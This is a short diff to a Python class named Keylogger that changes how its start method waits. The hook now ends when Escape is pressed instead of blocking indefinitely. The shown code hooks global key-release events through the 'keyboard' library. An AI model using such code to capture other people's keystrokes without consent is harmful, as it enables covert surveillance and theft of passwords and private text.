@@ -26,7 +26,7 @@ class Keylogger:
 
     def start(self):
         keyboard.on_release(callback=self.callback)
-        keyboard.wait()
+        keyboard.wait('esc')
 
     def stop(self):
         keyboard.unhook_all()
